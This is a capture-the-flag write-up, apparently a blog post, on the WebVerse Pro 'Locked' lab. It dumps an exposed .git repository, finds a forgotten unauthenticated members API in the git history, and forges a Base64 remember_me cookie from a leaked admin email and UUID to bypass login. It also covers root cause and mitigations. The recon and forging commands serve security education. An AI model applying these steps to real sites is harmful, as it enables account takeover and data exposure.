---
title: Locked - Exposed Git Repository to Authentication Bypass | Locked"
date: 2026-06-17 04:02:47 +0530
categories: [A07 - Authentication Failures, Authentication Bypass]
tags: [webverse-pro, ctf, git-disclosure, exposed-git, information-disclosure, remember-me-cookie, authentication-bypass]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/locked-auth-trust-boundary.webp
  alt: "Locked authentication bypass blog cover"
---

## Lab Link

Lab: [Locked](https://dashboard.webverselabs-pro.com/mystery-challenges/locked)

---

## Overview

Locked was an authentication trust-boundary challenge where the application exposed its `.git` directory publicly. By dumping the Git repository, reviewing the authentication logic, and comparing the live API surface with the committed source, I found an old unauthenticated members endpoint.

That endpoint leaked user emails and UUID values. The application’s `remember_me` authentication cookie trusted a Base64-encoded `email:uuid` pair, so the leaked values were enough to forge a valid cookie and authenticate as an administrator.

---

## Objective

Gain access to the protected application area and retrieve the challenge key code.

---

## Vulnerability Identification

```text
OWASP Top 10:2025
└── A07 - Authentication Failures
    ├── Exposed remember-me trust material
    ├── Reusable authentication cookie format
    └── Authentication bypass through leaked user UUID

Supporting issue
└── A05 - Security Misconfiguration
    └── Publicly accessible .git repository
```

The main vulnerability was not SQL injection or direct session guessing. The issue was that the application treated a client-controlled `remember_me` cookie as sufficient proof of identity when it contained a valid email and UUID pair.

The supporting misconfiguration was the exposed Git repository, which revealed source code and an older API route.

---

## Reconnaissance

I started with directory discovery using `ffuf`:

```bash
ffuf -u https://<LAB_HOST>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Interesting results included:

```text
.git/HEAD      [Status: 200]
api            [Status: 301]
includes       [Status: 301]
robots.txt     [Status: 200]
static         [Status: 301]
vendor         [Status: 403]
```

The most important finding was:

```text
.git/HEAD [Status: 200]
```

This confirmed that the Git repository was exposed.

---

## Repository Dump

After confirming `.git` exposure, I dumped the repository:

```bash
git-dumper https://<LAB_HOST>/.git/ repo
```

Inside the dumped project, the structure included:

```text
api/
app.php
composer.json
includes/
index.php
login.php
logout.php
README.md
realtime/
static/
```

The `includes/` directory contained the authentication and database logic:

```text
includes/
├── auth.php
├── chat.php
├── db.php
├── footer.php
└── header.php
```

---

## Authentication Logic Review

The key file was:

```bash
cat includes/auth.php
```

The `remember_me` handler decoded the cookie as a Base64 string:

```php
function locked_user_from_remember(): ?array {
    $raw = $_COOKIE['remember_me'] ?? '';
    if ($raw === '') {
        return null;
    }

    $decoded = base64_decode($raw, true);
    if ($decoded === false || strpos($decoded, ':') === false) {
        return null;
    }

    [$email, $uuid] = explode(':', $decoded, 2);
    $user = locked_user_by_email($email);

    if (!$user) {
        return null;
    }

    if (!hash_equals((string) $user['uuid'], $uuid)) {
        return null;
    }

    return $user;
}
```

This showed that the cookie format was:

```text
email:uuid
```

Then it was Base64 encoded and stored as:

```text
remember_me=<base64(email:uuid)>
```

The database helper confirmed that users were looked up by email and that UUID values were stored in the `users` table:

```php
function locked_user_by_email(string $email): ?array {
    $stmt = locked_db()->prepare("SELECT * FROM users WHERE email = :e LIMIT 1");
    $stmt->execute([':e' => $email]);
    return $stmt->fetch() ?: null;
}
```

At this stage, the attack depended on finding a valid user email and UUID.

---

## Git History Analysis

I checked the commit history:

```bash
git log --oneline --all
```

The history showed:

```text
01f01bb Document websocket fallback in README
be7bfc0 Replace members API with v2 version
af8635c Locked 4.2 — channels, members directory, remember-me sessions
```

The commit message `Replace members API with v2 version` was important because it suggested an older API may have existed before authentication was added.

Reviewing the commit diff showed that the old endpoint had been renamed from:

```text
api/v1/members.php
```

to:

```text
api/v2/members.php
```

The newer version added an authentication check:

```php
$me = locked_current_user();
if (!$me) {
    http_response_code(401);
    ...
}
```

This indicated that the older v1 endpoint might still be accessible on the live server.

---

## Exploitation

I requested the old API endpoint:

```bash
curl -X GET https://<LAB_HOST>/api/v1/members.php
```

The endpoint returned a members list containing display names, emails, UUIDs, and roles.

The administrator entry followed this structure:

```json
{
  "display_name": "Supt. Margaret Whitlock",
  "email": "<ADMIN_EMAIL>",
  "uuid": "<ADMIN_UUID>",
  "role": "admin"
}
```

This gave the two values needed for the `remember_me` cookie:

```text
<ADMIN_EMAIL>:<ADMIN_UUID>
```

I then generated the Base64 cookie value:

```bash
echo -n "<ADMIN_EMAIL>:<ADMIN_UUID>" | base64
```

That produced a forged cookie in the expected format:

```text
remember_me=<BASE64_ADMIN_EMAIL_UUID>
```

---

## Browser Authentication

In the browser, I added the forged cookie manually:

```text
Name: remember_me
Value: <BASE64_ADMIN_EMAIL_UUID>
Path: /
```

After refreshing the application, the server accepted the cookie, resolved it to the administrator account, and created an authenticated session.

This worked because `locked_current_user()` automatically trusted the remember-me cookie when no valid session was present:

```php
$user = locked_user_from_remember();
if ($user) {
    $_SESSION['uid'] = (int) $user['id'];
    return $user;
}
```

---

## Proof of Exploitation

After authenticating as the administrator, I navigated to the command endpoint:

```text
https://<LAB_HOST>/app.php?c=command
```

The protected page displayed the challenge key code.

```text
WEBVERSE{REDACTED}
```

---

## Root Cause Analysis

The root cause was a broken authentication trust boundary.

The application allowed the client to store and replay a long-lived authentication token built directly from user database fields:

```text
Base64(email:uuid)
```

Base64 is not encryption and does not provide integrity protection. Once the email and UUID were leaked, the cookie could be forged without knowing a password.

The issue was made exploitable by a second weakness: the exposed `.git` directory and the still-accessible old API endpoint. The source code revealed how the cookie was validated, and the old endpoint leaked the exact identity values required to forge it.

---

## Impact

An attacker could:

- Dump application source code from the exposed Git repository.
- Discover old or hidden endpoints from Git history.
- Retrieve user emails and UUIDs from an unauthenticated API.
- Forge a valid `remember_me` cookie.
- Authenticate as an administrator.
- Access protected functionality and retrieve sensitive data.

In a real application, this could lead to account takeover, sensitive data exposure, privilege escalation, and unauthorized administrative actions.

---

## Mitigation

### Protect Git Metadata

Never expose `.git` directories in production.

Recommended controls:

```text
- Block access to /.git/ at the web server level.
- Exclude .git from deployment artifacts.
- Add CI/CD checks for accidental source control exposure.
```

### Remove Deprecated Endpoints

Old endpoints should be removed or protected.

```text
- Delete unused API versions.
- Apply authentication consistently across all API versions.
- Monitor for forgotten legacy routes.
```

### Replace Predictable Remember-Me Tokens

Do not build remember-me cookies from user-identifying database fields.

A safer approach:

```text
- Generate a cryptographically random token.
- Store only a hashed version server-side.
- Bind token metadata to user, expiry, and rotation state.
- Rotate token after use.
- Revoke tokens on logout or password change.
```

### Add Cookie Integrity

Authentication cookies should be signed or backed by server-side state.

```text
- Use HMAC-signed tokens if stateless.
- Prefer opaque random tokens stored server-side.
- Set HttpOnly, Secure, and SameSite attributes.
```

---

## Lessons Learned

This lab showed how source code exposure can turn a weak authentication design into a full account takeover.

The main learning points were:

```text
1. Public .git exposure can reveal routes, source logic, and historical changes.
2. Git history is often more valuable than the current source tree.
3. Base64-encoded authentication data is not secure.
4. Remember-me cookies must be random, server-validated, and revocable.
5. Deprecated API endpoints must be removed, not just replaced.
```

---

## Final Takeaway

Locked was a good example of how multiple small issues can chain into a serious authentication bypass.

The exposed Git repository revealed the authentication mechanism and Git history exposed the old members API. The old endpoint leaked the exact values required to forge the remember-me cookie, which allowed administrator access and retrieval of the protected key code.
